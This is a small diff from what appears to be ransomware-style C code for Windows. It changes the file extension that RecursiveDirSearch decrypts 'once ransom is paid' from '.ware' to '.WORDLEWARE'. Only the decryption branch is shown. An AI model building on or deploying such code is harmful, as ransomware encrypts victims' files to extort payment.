@@ -178,7 +178,7 @@ WCHAR* RecursiveDirSearch(WCHAR folderName[], WCHAR listOfFileExtensions[], HKEY
 				}
 
 				//once "ransom" is paid, if file with a .ware extension is found, decrypt it
-				else if (decrypt && MatchesFileExtension(GetFileExtension(path), L".ware")) {
+				else if (decrypt && MatchesFileExtension(GetFileExtension(path), L".WORDLEWARE")) {
 					//decrypt files here
 					DecryptBytes(path, hKey);
 				}
@@ -193,4 +193,5 @@ WCHAR* RecursiveDirSearch(WCHAR folderName[], WCHAR listOfFileExtensions[], HKEY
 	}
 	//clean up
 	FindClose(hFile);
+
 }
